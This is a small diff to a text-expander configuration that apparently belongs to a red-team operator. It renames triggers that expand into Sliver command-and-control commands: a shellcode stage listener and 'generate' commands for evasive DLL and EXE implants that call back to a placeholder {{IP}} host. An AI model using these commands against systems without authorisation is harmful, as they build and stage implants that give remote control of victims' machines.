@@ -99,10 +99,10 @@ matches:
   - trigger: ":sliverstage"
     replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile win-shellcode
 
-  - trigger: ":sliverdllgen"
+  - trigger: ":sliverdllgens"
     replace: generate -e -f shared -m {{IP}}:443 -R
 
-  - trigger: ":sliverexegen"
+  - trigger: ":sliverexegens"
     replace: generate -e -f exe -m {{IP}}:443
 
   - trigger: ":sliverdllgenb"
